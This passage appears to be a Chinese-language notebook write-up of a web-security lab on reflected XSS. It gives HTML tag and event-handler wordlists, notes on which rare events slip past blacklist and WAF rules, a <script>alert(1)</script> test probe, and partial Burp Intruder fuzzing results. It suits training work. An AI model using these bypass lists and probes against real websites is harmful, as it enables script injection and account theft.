id="u22cca70a" class="ne-p"><span class="ne-text">command</span></p><p id="uf637b02e" class="ne-p"><span class="ne-text">content</span></p><p id="ub634d775" class="ne-p"><span class="ne-text">data</span></p><p id="ude1f118b" class="ne-p"><span class="ne-text">datalist</span></p><p id="u1bc53254" class="ne-p"><span class="ne-text">dd</span></p><p id="uecf24814" class="ne-p"><span class="ne-text">del</span></p><p id="ucf41fc19" class="ne-p"><span class="ne-text">details</span></p><p id="u90f97353" class="ne-p"><span class="ne-text">dfn</span></p><p id="ua8525d55" class="ne-p"><span class="ne-text">dialog</span></p><p id="u7f84b85d" class="ne-p"><span class="ne-text">dir</span></p><p id="u2c5feb0d" class="ne-p"><span class="ne-text">div</span></p><p id="ued6c8df3" class="ne-p"><span class="ne-text">dl</span></p><p id="uc5227aef" class="ne-p"><span class="ne-text">dt</span></p><p id="u9db60c12" class="ne-p"><span class="ne-text">element</span></p><p id="u229ac5d8" class="ne-p"><span class="ne-text">em</span></p><p id="uc064aeb0" class="ne-p"><span class="ne-text">embed</span></p><p id="u767a8b61" class="ne-p"><span class="ne-text">fieldset</span></p><p id="u7543e5a0" class="ne-p"><span class="ne-text">figcaption</span></p><p id="u9e0b3b54" class="ne-p"><span class="ne-text">figure</span></p><p id="ucd661876" class="ne-p"><span class="ne-text">font</span></p><p id="uc407e1be" class="ne-p"><span class="ne-text">footer</span></p><p id="u02601305" class="ne-p"><span class="ne-text">form</span></p><p id="ufa316104" class="ne-p"><span class="ne-text">frame</span></p><p id="ud42d1f02" class="ne-p"><span class="ne-text">frameset</span></p><p id="u9968a6c8" class="ne-p"><span class="ne-text">h1</span></p><p id="ud0ccc35f" class="ne-p"><span class="ne-text">head</span></p><p id="ud91677cb" class="ne-p"><span class="ne-text">header</span></p><p id="u41365f09" class="ne-p"><span class="ne-text">hgroup</span></p><p id="u0fe8b493" class="ne-p"><span class="ne-text">hr</span></p><p id="u4fb07681" class="ne-p"><span class="ne-text">html</span></p><p id="uc945e2d5" class="ne-p"><span class="ne-text">i</span></p><p id="u128b347b" class="ne-p"><span class="ne-text">iframe</span></p><p id="u150c88f1" class="ne-p"><span class="ne-text">image</span></p><p id="u240f80b4" class="ne-p"><span class="ne-text">img</span></p><p id="ued8d61b1" class="ne-p"><span class="ne-text">input</span></p><p id="u068c9785" class="ne-p"><span class="ne-text">ins</span></p><p id="u3dfead53" class="ne-p"><span class="ne-text">kbd</span></p><p id="u895ee41f" class="ne-p"><span class="ne-text">keygen</span></p><p id="ubf495da4" class="ne-p"><span class="ne-text">label</span></p><p id="udd25d78d" class="ne-p"><span class="ne-text">legend</span></p><p id="uf9d61ac5" class="ne-p"><span class="ne-text">li</span></p><p id="uc8944971" class="ne-p"><span class="ne-text">link</span></p><p id="u38a1e9c2" class="ne-p"><span class="ne-text">listing</span></p><p id="u1aed36bb" class="ne-p"><span class="ne-text">main</span></p><p id="uf9dd2e77" class="ne-p"><span class="ne-text">map</span></p><p id="u77113b12" class="ne-p"><span class="ne-text">mark</span></p><p id="u78d784f3" class="ne-p"><span class="ne-text">marquee</span></p><p id="uf982fe77" class="ne-p"><span class="ne-text">menu</span></p><p id="uee6287aa" class="ne-p"><span class="ne-text">menuitem</span></p><p id="u6e3b9913" class="ne-p"><span class="ne-text">meta</span></p><p id="ud9b969a3" class="ne-p"><span class="ne-text">meter</span></p><p id="uef0af41e" class="ne-p"><span class="ne-text">multicol</span></p><p id="u16e969b2" class="ne-p"><span class="ne-text">nav</span></p><p id="u8bb87269" class="ne-p"><span class="ne-text">nextid</span></p><p id="u6590de49" class="ne-p"><span class="ne-text">nobr</span></p><p id="u1802735f" class="ne-p"><span class="ne-text">noembed</span></p><p id="u48f88907" class="ne-p"><span class="ne-text">noframes</span></p><p id="ub0467fb6" class="ne-p"><span class="ne-text">noscript</span></p><p id="u92b42107" class="ne-p"><span class="ne-text">object</span></p><p id="ua54bf463" class="ne-p"><span class="ne-text">ol</span></p><p id="u8789d508" class="ne-p"><span class="ne-text">optgroup</span></p><p id="u4cc36b39" class="ne-p"><span class="ne-text">option</span></p><p id="u66ac5fbf" class="ne-p"><span class="ne-text">output</span></p><p id="uaa53d63e" class="ne-p"><span class="ne-text">p</span></p><p id="u6dd29d5c" class="ne-p"><span class="ne-text">param</span></p><p id="uf46b272f" class="ne-p"><span class="ne-text">picture</span></p><p id="uf7abca63" class="ne-p"><span class="ne-text">plaintext</span></p><p id="u2874de0b" class="ne-p"><span class="ne-text">pre</span></p><p id="u53018f37" class="ne-p"><span class="ne-text">progress</span></p><p id="u446de7de" class="ne-p"><span class="ne-text">q</span></p><p id="uccf6dc7f" class="ne-p"><span class="ne-text">rb</span></p><p id="u047f86f8" class="ne-p"><span class="ne-text">rp</span></p><p id="ue64ce159" class="ne-p"><span class="ne-text">rt</span></p><p id="ub7da424a" class="ne-p"><span class="ne-text">rtc</span></p><p id="u5984b78c" class="ne-p"><span class="ne-text">ruby</span></p><p id="u59aa4872" class="ne-p"><span class="ne-text">s</span></p><p id="u34bc9139" class="ne-p"><span class="ne-text">samp</span></p><p id="ue4385818" class="ne-p"><span class="ne-text">script</span></p><p id="u3891d3cc" class="ne-p"><span class="ne-text">section</span></p><p id="u02143a3e" class="ne-p"><span class="ne-text">select</span></p><p id="ufa16c527" class="ne-p"><span class="ne-text">set</span></p><p id="ud8d9e501" class="ne-p"><span class="ne-text">shadow</span></p><p id="u73058281" class="ne-p"><span class="ne-text">slot</span></p><p id="u48097076" class="ne-p"><span class="ne-text">small</span></p><p id="uc9986938" class="ne-p"><span class="ne-text">source</span></p><p id="u01620c7d" class="ne-p"><span class="ne-text">spacer</span></p><p id="u2e3284c5" class="ne-p"><span class="ne-text">span</span></p><p id="u04da3e0c" class="ne-p"><span class="ne-text">strike</span></p><p id="u5709d45d" class="ne-p"><span class="ne-text">strong</span></p><p id="ud9cd90ab" class="ne-p"><span class="ne-text">style</span></p><p id="u96563722" class="ne-p"><span class="ne-text">sub</span></p><p id="u958d0c17" class="ne-p"><span class="ne-text">summary</span></p><p id="ued9b7597" class="ne-p"><span class="ne-text">sup</span></p><p id="u848c9efa" class="ne-p"><span class="ne-text">svg</span></p><p id="ud78ca2a0" class="ne-p"><span class="ne-text">table</span></p><p id="u6b0edd82" class="ne-p"><span class="ne-text">tbody</span></p><p id="ue84cc7f2" class="ne-p"><span class="ne-text">td</span></p><p id="uc2471a1f" class="ne-p"><span class="ne-text">template</span></p><p id="uc3ae59f1" class="ne-p"><span class="ne-text">textarea</span></p><p id="ub1901546" class="ne-p"><span class="ne-text">tfoot</span></p><p id="ubfb725fb" class="ne-p"><span class="ne-text">th</span></p><p id="u972872fd" class="ne-p"><span class="ne-text">thead</span></p><p id="ub4b90470" class="ne-p"><span class="ne-text">time</span></p><p id="uffbe28ee" class="ne-p"><span class="ne-text">title</span></p><p id="ue0df389e" class="ne-p"><span class="ne-text">tr</span></p><p id="ub2b222ba" class="ne-p"><span class="ne-text">track</span></p><p id="u7b38b867" class="ne-p"><span class="ne-text">tt</span></p><p id="ud174f371" class="ne-p"><span class="ne-text">u</span></p><p id="u45290032" class="ne-p"><span class="ne-text">ul</span></p><p id="u65a6cad4" class="ne-p"><span class="ne-text">var</span></p><p id="u5acbe5b0" class="ne-p"><span class="ne-text">video</span></p><p id="u34458b1e" class="ne-p"><span class="ne-text">wbr</span></p><p id="u54e19105" class="ne-p"><span class="ne-text">xmp</span></p><p id="u2a424909" class="ne-p"><span class="ne-text">xss</span></p></details>
<details class="lake-collapse"><summary id="u5ecb4c66"><span class="ne-text">事件</span></summary><p id="u11f8a6c2" class="ne-p"><span class="ne-text">onafterprint</span></p><p id="u3040fc38" class="ne-p"><span class="ne-text">onanimationcancel</span></p><p id="u0389d069" class="ne-p"><span class="ne-text">onanimationend</span></p><p id="u28f22643" class="ne-p"><span class="ne-text">onanimationiteration</span></p><p id="u56737d3b" class="ne-p"><span class="ne-text">onanimationstart</span></p><p id="u02848e75" class="ne-p"><span class="ne-text">onauxclick</span></p><p id="uf3c4790d" class="ne-p"><span class="ne-text">onbeforecopy</span></p><p id="u9807ca1a" class="ne-p"><span class="ne-text">onbeforecut</span></p><p id="u074dee04" class="ne-p"><span class="ne-text">onbeforeinput</span></p><p id="uf9dcba28" class="ne-p"><span class="ne-text">onbeforematch</span></p><p id="u566ea36c" class="ne-p"><span class="ne-text">onbeforepaste</span></p><p id="u7b76ef29" class="ne-p"><span class="ne-text">onbeforeprint</span></p><p id="u5bc20c96" class="ne-p"><span class="ne-text">onbeforetoggle</span></p><p id="u110797a1" class="ne-p"><span class="ne-text">onbeforeunload</span></p><p id="u02be2f03" class="ne-p"><span class="ne-text">onbegin</span></p><p id="u91ffc36a" class="ne-p"><span class="ne-text">onblur</span></p><p id="uef3b8396" class="ne-p"><span class="ne-text">oncancel</span></p><p id="ue6fa59da" class="ne-p"><span class="ne-text">oncanplay</span></p><p id="ue9525017" class="ne-p"><span class="ne-text">oncanplaythrough</span></p><p id="ub43df56c" class="ne-p"><span class="ne-text">onchange</span></p><p id="u03ddcf1b" class="ne-p"><span class="ne-text">onclick</span></p><p id="u8e2ff96f" class="ne-p"><span class="ne-text">onclose</span></p><p id="u0b8119b1" class="ne-p"><span class="ne-text">oncommand</span></p><p id="u34b5f53a" class="ne-p"><span class="ne-text">oncontentvisibilityautostatechange</span></p><p id="u77716499" class="ne-p"><span class="ne-text">oncontentvisibilityautostatechange(hidden)</span></p><p id="u7f63e6de" class="ne-p"><span class="ne-text">oncontextmenu</span></p><p id="u6cbae203" class="ne-p"><span class="ne-text">oncopy</span></p><p id="u8868cfa6" class="ne-p"><span class="ne-text">oncuechange</span></p><p id="u3d0d854d" class="ne-p"><span class="ne-text">oncut</span></p><p id="u9bcb4e72" class="ne-p"><span class="ne-text">ondblclick</span></p><p id="uc11ed5fa" class="ne-p"><span class="ne-text">ondrag</span></p><p id="u7d230a2b" class="ne-p"><span class="ne-text">ondragend</span></p><p id="u61b521fa" class="ne-p"><span class="ne-text">ondragenter</span></p><p id="u62ea15d2" class="ne-p"><span class="ne-text">ondragexit</span></p><p id="ue7f14bf5" class="ne-p"><span class="ne-text">ondragleave</span></p><p id="uc809f770" class="ne-p"><span class="ne-text">ondragover</span></p><p id="ubdce7186" class="ne-p"><span class="ne-text">ondragstart</span></p><p id="u83158a57" class="ne-p"><span class="ne-text">ondrop</span></p><p id="u12201aeb" class="ne-p"><span class="ne-text">ondurationchange</span></p><p id="u95a5f182" class="ne-p"><span class="ne-text">onend</span></p><p id="u4d06adde" class="ne-p"><span class="ne-text">onended</span></p><p id="u6f1caf9b" class="ne-p"><span class="ne-text">onerror</span></p><p id="uee555249" class="ne-p"><span class="ne-text">onfocus</span></p><p id="u25f9e568" class="ne-p"><span class="ne-text">onfocus(autofocus)</span></p><p id="u2c8fc484" class="ne-p"><span class="ne-text">onfocusin</span></p><p id="u335e1992" class="ne-p"><span class="ne-text">onfocusout</span></p><p id="ufcc20dc8" class="ne-p"><span class="ne-text">onformdata</span></p><p id="u33f2dd45" class="ne-p"><span class="ne-text">onfullscreenchange</span></p><p id="u8796bb75" class="ne-p"><span class="ne-text">ongesturechange</span></p><p id="u4409456b" class="ne-p"><span class="ne-text">ongestureend</span></p><p id="ufe604b8e" class="ne-p"><span class="ne-text">ongesturestart</span></p><p id="uc1f6a08f" class="ne-p"><span class="ne-text">ongotpointercapture</span></p><p id="u7f4dd358" class="ne-p"><span class="ne-text">onhashchange</span></p><p id="u9d9bae7e" class="ne-p"><span class="ne-text">oninput</span></p><p id="uc11f5083" class="ne-p"><span class="ne-text">oninvalid</span></p><p id="u581f1c64" class="ne-p"><span class="ne-text">onkeydown</span></p><p id="u2ac62142" class="ne-p"><span class="ne-text">onkeypress</span></p><p id="u3741d8a3" class="ne-p"><span class="ne-text">onkeyup</span></p><p id="ue047bef7" class="ne-p"><span class="ne-text">onload</span></p><p id="ubb2ff237" class="ne-p"><span class="ne-text">onloadeddata</span></p><p id="ubf5cee27" class="ne-p"><span class="ne-text">onloadedmetadata</span></p><p id="u636f8ae5" class="ne-p"><span class="ne-text">onloadstart</span></p><p id="ud39eacf0" class="ne-p"><span class="ne-text">onlocation</span></p><p id="u5882b98b" class="ne-p"><span class="ne-text">onlostpointercapture</span></p><p id="u832c7e91" class="ne-p"><span class="ne-text">onmessage</span></p><p id="u338c5850" class="ne-p"><span class="ne-text">onmousedown</span></p><p id="u9937c0ef" class="ne-p"><span class="ne-text">onmouseenter</span></p><p id="u47ca1008" class="ne-p"><span class="ne-text">onmouseleave</span></p><p id="u313cb358" class="ne-p"><span class="ne-text">onmousemove</span></p><p id="u0bc4f8e0" class="ne-p"><span class="ne-text">onmouseout</span></p><p id="ua0db6bb5" class="ne-p"><span class="ne-text">onmouseover</span></p><p id="u9e5fae9f" class="ne-p"><span class="ne-text">onmouseup</span></p><p id="u9439af86" class="ne-p"><span class="ne-text">onmousewheel</span></p><p id="u6e978555" class="ne-p"><span class="ne-text">onmozfullscreenchange</span></p><p id="udc5eaf49" class="ne-p"><span class="ne-text">onpagehide</span></p><p id="uf41af3fc" class="ne-p"><span class="ne-text">onpagereveal</span></p><p id="ue306863f" class="ne-p"><span class="ne-text">onpageshow</span></p><p id="ub7b85958" class="ne-p"><span class="ne-text">onpageswap</span></p><p id="ub97f3c85" class="ne-p"><span class="ne-text">onpaste</span></p><p id="udc9a530a" class="ne-p"><span class="ne-text">onpause</span></p><p id="uc65d27ce" class="ne-p"><span class="ne-text">onplay</span></p><p id="u428d3d1a" class="ne-p"><span class="ne-text">onplaying</span></p><p id="u31426c27" class="ne-p"><span class="ne-text">onpointercancel</span></p><p id="u1fac819b" class="ne-p"><span class="ne-text">onpointerdown</span></p><p id="u2a6fe2e0" class="ne-p"><span class="ne-text">onpointerenter</span></p><p id="ucdac0f50" class="ne-p"><span class="ne-text">onpointerleave</span></p><p id="u95abdced" class="ne-p"><span class="ne-text">onpointermove</span></p><p id="u06a3b8c0" class="ne-p"><span class="ne-text">onpointerout</span></p><p id="u28beaf35" class="ne-p"><span class="ne-text">onpointerover</span></p><p id="u4c3cc6db" class="ne-p"><span class="ne-text">onpointerrawupdate</span></p><p id="ua6d07bb0" class="ne-p"><span class="ne-text">onpointerup</span></p><p id="u2a6cb09c" class="ne-p"><span class="ne-text">onpopstate</span></p><p id="u0fd365f5" class="ne-p"><span class="ne-text">onprogress</span></p><p id="ua619bd9c" class="ne-p"><span class="ne-text">onpromptaction</span></p><p id="u8ce83223" class="ne-p"><span class="ne-text">onpromptdismiss</span></p><p id="u614fafa5" class="ne-p"><span class="ne-text">onratechange</span></p><p id="uae6f2afd" class="ne-p"><span class="ne-text">onrepeat</span></p><p id="u98d07b68" class="ne-p"><span class="ne-text">onreset</span></p><p id="u8164e026" class="ne-p"><span class="ne-text">onresize</span></p><p id="u944ec3a9" class="ne-p"><span class="ne-text">onscroll</span></p><p id="u155be667" class="ne-p"><span class="ne-text">onscrollend</span></p><p id="u44db9f16" class="ne-p"><span class="ne-text">onscrollsnapchange</span></p><p id="uaaa8f984" class="ne-p"><span class="ne-text">onscrollsnapchanging</span></p><p id="u1693fc44" class="ne-p"><span class="ne-text">onsearch</span></p><p id="udaf2b931" class="ne-p"><span class="ne-text">onsecuritypolicyviolation</span></p><p id="ufb5b7130" class="ne-p"><span class="ne-text">onseeked</span></p><p id="u46316e4f" class="ne-p"><span class="ne-text">onseeking</span></p><p id="u084b16bd" class="ne-p"><span class="ne-text">onselect</span></p><p id="ue331b10f" class="ne-p"><span class="ne-text">onselectionchange</span></p><p id="uea7604b3" class="ne-p"><span class="ne-text">onselectstart</span></p><p id="ufc88e307" class="ne-p"><span class="ne-text">onslotchange</span></p><p id="u753ca26b" class="ne-p"><span class="ne-text">onsubmit</span></p><p id="uae554b7b" class="ne-p"><span class="ne-text">onsuspend</span></p><p id="ua4569ea0" class="ne-p"><span class="ne-text">ontimeupdate</span></p><p id="u47d59d76" class="ne-p"><span class="ne-text">ontoggle</span></p><p id="u183b46ec" class="ne-p"><span class="ne-text">ontoggle(popover)</span></p><p id="uec4444a0" class="ne-p"><span class="ne-text">ontouchcancel</span></p><p id="u5db31f83" class="ne-p"><span class="ne-text">ontouchend</span></p><p id="u1c4dd821" class="ne-p"><span class="ne-text">ontouchmove</span></p><p id="ue101ed3c" class="ne-p"><span class="ne-text">ontouchstart</span></p><p id="u96371842" class="ne-p"><span class="ne-text">ontransitioncancel</span></p><p id="uc6697eb1" class="ne-p"><span class="ne-text">ontransitionend</span></p><p id="u482d6d4a" class="ne-p"><span class="ne-text">ontransitionrun</span></p><p id="u3a616818" class="ne-p"><span class="ne-text">ontransitionstart</span></p><p id="u27ebb0a4" class="ne-p"><span class="ne-text">onunhandledrejection</span></p><p id="u721bffbc" class="ne-p"><span class="ne-text">onunload</span></p><p id="u66d778e1" class="ne-p"><span class="ne-text">onvalidationstatuschange</span></p><p id="ud18989c4" class="ne-p"><span class="ne-text">onvolumechange</span></p><p id="uf11b14fd" class="ne-p"><span class="ne-text">onwaiting</span></p><p id="u33365e13" class="ne-p"><span class="ne-text">onwaiting(loop)</span></p><p id="ud26d0bdc" class="ne-p"><span class="ne-text">onwebkitanimationend</span></p><p id="u969eca1f" class="ne-p"><span class="ne-text">onwebkitanimationiteration</span></p><p id="ua5430794" class="ne-p"><span class="ne-text">onwebkitanimationstart</span></p><p id="ub44901ea" class="ne-p"><span class="ne-text">onwebkitfullscreenchange</span></p><p id="u699fa21a" class="ne-p"><span class="ne-text">onwebkitmouseforcechanged</span></p><p id="ubf785e35" class="ne-p"><span class="ne-text">onwebkitmouseforcedown</span></p><p id="uea9e6d21" class="ne-p"><span class="ne-text">onwebkitmouseforceup</span></p><p id="u3f6b0ce8" class="ne-p"><span class="ne-text">onwebkitmouseforcewillbegin</span></p><p id="uf7616426" class="ne-p"><span class="ne-text">onwebkitneedkey</span></p><p id="ub5ad8fb8" class="ne-p"><span class="ne-text">onwebkitplaybacktargetavailabilitychanged</span></p><p id="ufd2955ad" class="ne-p"><span class="ne-text">onwebkitpresentationmodechanged</span></p><p id="u498e28b6" class="ne-p"><span class="ne-text">onwebkittransitionend</span></p><p id="uc5b04b35" class="ne-p"><span class="ne-text">onwebkitwillrevealbottom</span></p><p id="ue77a1465" class="ne-p"><span class="ne-text">onwheel</span></p></details>
<details class="lake-collapse"><summary id="ue47b2b01"></summary><h1 id="U6uda"><span class="ne-text">常用HTML事件分类整理（按使用频率划分）</span></h1><h2 id="WakUN"><span class="ne-text">一、页面生命周期事件（页面加载/关闭）</span></h2><ol class="ne-ol"><li id="uc1faa911" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onload</span></code><span class="ne-text">：元素/页面加载完成触发</span></li><li id="u11d7199c" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onpageshow</span></code><span class="ne-text">：页面从缓存加载完成</span></li><li id="u68279146" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onbeforeunload</span></code><span class="ne-text">：用户关闭/刷新页面前弹窗确认</span></li><li id="u01304971" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onunload</span></code><span class="ne-text">：页面卸载关闭时执行</span></li><li id="u597fa3ac" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onhashchange</span></code><span class="ne-text">：URL锚点#值变化触发</span></li><li id="uf8d738f9" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onresize</span></code><span class="ne-text">：浏览器窗口大小改变（本实验可用核心事件）</span></li><li id="u910ede01" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onscroll</span></code><span class="ne-text">：页面滚动时持续触发</span></li></ol><h2 id="egnu0"><span class="ne-text">二、鼠标交互事件（最常被过滤）</span></h2><ol class="ne-ol"><li id="u0f7b6e7b" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onclick</span></code><span class="ne-text">：鼠标左键单击</span></li><li id="ued18d291" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">ondblclick</span></code><span class="ne-text">：鼠标双击</span></li><li id="u2fe2a5b3" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onmouseover</span></code><span class="ne-text">：鼠标移入元素</span></li><li id="u9d99fa5a" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onmouseout</span></code><span class="ne-text">：鼠标移出元素</span></li><li id="u7aa97748" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onmouseenter</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">onmouseleave</span></code><span class="ne-text">：无冒泡的移入移出</span></li><li id="ua4ad9737" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onmousedown</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">onmouseup</span></code><span class="ne-text">：鼠标按下、松开</span></li><li id="ufb985497" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">oncontextmenu</span></code><span class="ne-text">：右键弹出菜单</span></li><li id="ue8215243" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onwheel</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">onmousewheel</span></code><span class="ne-text">：鼠标滚轮滚动</span></li></ol><h2 id="FIIra"><span class="ne-text">三、键盘输入事件</span></h2><ol class="ne-ol"><li id="u85f535a0" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onkeydown</span></code><span class="ne-text">：按下任意按键</span></li><li id="uf6f56dfd" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onkeypress</span></code><span class="ne-text">：按下字符键（字母/数字）</span></li><li id="u6bac4c42" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onkeyup</span></code><span class="ne-text">：松开按键</span></li></ol><h2 id="jun0n"><span class="ne-text">四、表单控件事件</span></h2><ol class="ne-ol"><li id="u3e8804cb" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">oninput</span></code><span class="ne-text">：输入框内容实时变更</span></li><li id="u610b8619" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onchange</span></code><span class="ne-text">：输入框失去焦点、内容发生变化</span></li><li id="ucc003201" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onfocus</span></code><span class="ne-text">：输入框获取光标焦点</span></li><li id="u57fbbe5e" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onblur</span></code><span class="ne-text">：输入框失去光标焦点</span></li><li id="ua76b0d89" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onpaste</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">oncopy</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">oncut</span></code><span class="ne-text">：粘贴、复制、剪切</span></li><li id="u305bf4a0" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onsubmit</span></code><span class="ne-text">：表单点击提交按钮</span></li><li id="u2a00f6bd" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onreset</span></code><span class="ne-text">：表单重置按钮触发</span></li></ol><h2 id="tFqsP"><span class="ne-text">五、媒体音视频事件（video/audio标签）</span></h2><ol class="ne-ol"><li id="ueeb3981e" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onplay</span></code><span class="ne-text">：视频开始播放</span></li><li id="ubd95dd10" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onpause</span></code><span class="ne-text">：视频暂停</span></li><li id="u680b8b7a" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onended</span></code><span class="ne-text">：视频播放完毕</span></li><li id="ubb077736" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">oncanplay</span></code><span class="ne-text">：视频加载到可播放状态</span></li><li id="u0d4eef34" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onvolumechange</span></code><span class="ne-text">：音量调节</span></li></ol><h2 id="tpzuq"><span class="ne-text">六、冷门但常绕过黑名单的事件（Web靶场高频Payload）</span></h2><ol class="ne-ol"><li id="uead0e132" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">ontoggle</span></code><span class="ne-text">：</span><code class="ne-code"><span class="ne-text">&lt;details&gt;</span></code><span class="ne-text">折叠标签展开/收起触发</span></li><li id="ue485e2ca" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onresize</span></code><span class="ne-text">：窗口缩放，本实验放行事件</span></li><li id="u575c7168" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onauxclick</span></code><span class="ne-text">：鼠标中键/侧键点击</span></li><li id="u6a1c9dab" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onpointerover</span></code><span class="ne-text">：触屏/触控设备悬浮事件</span></li><li id="u5cf48aa6" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onbeforeprint</span></code><span class="ne-text"> / </span><code class="ne-code"><span class="ne-text">onafterprint</span></code><span class="ne-text">：打印前后触发</span></li></ol><h2 id="dGu3C"><span class="ne-text">七、资源加载错误事件（图片注入经典）</span></h2><ol class="ne-ol"><li id="u9996c3f3" data-lake-index-type="0"><code class="ne-code"><span class="ne-text">onerror</span></code><span class="ne-text">：图片、脚本加载失败时执行（最经典XSS事件）</span></li></ol><h2 id="ARsXi"><span class="ne-text">补充说明</span></h2><ol class="ne-ol"><li id="u7fe4fd8a" data-lake-index-type="0"><strong><span class="ne-text">黑名单优先拦截</span></strong><span class="ne-text">：</span><code class="ne-code"><span class="ne-text">onclick</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">onerror</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">onmouseover</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">onload</span></code><span class="ne-text"> 是WAF/过滤规则第一波拦截对象；</span></li><li id="u7b11c292" data-lake-index-type="0"><strong><span class="ne-text">绕过首选</span></strong><span class="ne-text">：</span><code class="ne-code"><span class="ne-text">onresize</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">ontoggle</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">onauxclick</span></code><span class="ne-text">、</span><code class="ne-code"><span class="ne-text">onpageshow</span></code><span class="ne-text"> 这类低频事件，多数过滤规则遗漏，是靶场标准解题载荷。</span></li></ol></details>
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781865329628-9e71daea-5ea2-4570-aff1-1a4ff6b06230.png)



搜索<script>alert(1)</script>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781865655583-14f398eb-775c-4561-97d8-0b3c5f99374f.png)

搜索test

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781865378597-2ba25f48-11fb-4f53-bb4c-178f81320078.png)

test"

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781865421925-be14eea7-0d61-44ac-b48f-7798c6529339.png)’





思路：标签黑了，用burp intruder逐个试哪个标签/事件没被黑

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781866782693-f3394e91-071f-4a36-ad4e-e2ab98e6a39e.png)

xss和body

<details class="lake-collapse"><summary id="ud0527585"><span class="ne-text">成功事件：</span></summary><p id="ufaf49bfa" class="ne-p"><span class="ne-text">9</span></p><p id="u979f887b" class="ne-p"><span class="ne-text">onbeforeinput</span></p><p id="u4e4b1192" class="ne-p"><span class="ne-text">200</span></p><p id="u9578ca9f" class="ne-p"><span class="ne-text">271</span></p><p id="u882f6841" class="ne-p"><span class="ne-text">false</span></p><p id="u3e5d8ad1" class="ne-p"><span class="ne-text">false</span></p><p id="u2fa7118b" class="ne-p"><span class="ne-text">3598</span></p><p id="u4c6f8032" class="ne-p"><span class="ne-text">10</span></p><p id="ue23eea2d" class="ne-p"><span class="ne-text">onbeforematch</span></p><p id="ua2263549" class="ne-p"><span class="ne-text">200</span></p><p id="u1ff0b32c" class="ne-p"><span class="ne-text">320</span></p><p id="u35e6823c" class="ne-p"><span class="ne-text">false</span></p><p id="ue34ed053" class="ne-p"><span class="ne-text">false</span></p><p id="u8ccd6e3f" class="ne-p"><span class="ne-text">3598</span></p><p id="ua24412c9" class="ne-p"><span class="ne-text">13</span></p><p id="u1c9942d5" class="ne-p"><span class="ne-text">onbeforetoggle</span></p><p id="u52613e8e" class="ne-p"><span class="ne-text">200</span></p><p id="ucc1e3057" class="ne-p"><span class="ne-text">318</span></p><p id="uf4092c97" class="ne-p"><span class="ne-text">false</span></p><p id="ua971bdac" class="ne-p"><span class="ne-text">false</span></p><p id="ua5876068" class="ne-p"><span class="ne-text">3599</span></p><p id="u0cb986e0" class="ne-p"><span class="ne-text">17</span></p><p id="ubd945577" class="ne-p"><span class="ne-text">oncancel</span></p><p id="u8179afb2" class="ne-p"><span class="ne-text">200</span></p><p id="ub6cf4954" class="ne-p"><span class="ne-text">317</span></p><p id="ucfeca758" class="ne-p"><span class="ne-text">false</span></p><p id="uc2a4f15c" class="ne-p"><span class="ne-text">false</span></p><p id="ud7619632" class="ne-p"><span class="ne-text">3593</span></p><p id="ua94900d9" class="ne-p"><span class="ne-text">23</span></p><p id="u719bec33" class="ne-p"><span class="ne-text">oncommand</span></p><p id="uec20546c" class="ne-p"><span class="ne-text">200</span></p><p id="u9a87554f" class="ne-p"><span class="ne-text">274</span></p><p id="ud70a050b" class="ne-p"><span class="ne-text">false</span></p><p id="u7cdad7fe" class="ne-p"><span class="ne-text">false</span></p><p id="u856f85d7" class="ne-p"><span class="ne-text">3594</span></p><p id="u739306f2" class="ne-p"><span class="ne-text">24</span></p><p id="u71e92cb9" class="ne-p"><span class="ne-text">oncontentvisibilityautostatechange</span></p><p id="u5daca364" class="ne-p"><span class="ne-text">200</span></p><p id="u7dbe3666" class="ne-p"><span class="ne-text">273</span></p><p 